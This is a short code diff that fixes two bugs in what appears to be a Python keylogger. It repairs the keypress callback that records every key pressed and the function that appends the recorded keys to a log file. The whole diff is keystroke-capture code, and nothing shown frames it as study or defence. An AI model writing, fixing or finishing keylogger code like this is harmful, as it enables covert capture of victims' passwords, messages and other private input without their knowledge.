@@ -49,7 +49,7 @@ def on_press(key):
     global keys, count
     
     print(key)
-    keys.appen(key)
+    keys.append(key)
     count += 1
     
     if count>= 1:
@@ -60,7 +60,7 @@ def on_press(key):
 def  write_file(keys):
     with open(file_path + extend + keys_info, "a") as k:
         for key in keys:
-            c = str(key).replace("'", " ")
+            c = str(key).replace("'", "")
             if c.find ("space") > 0:
                 k.write('\n')
                 k.close()
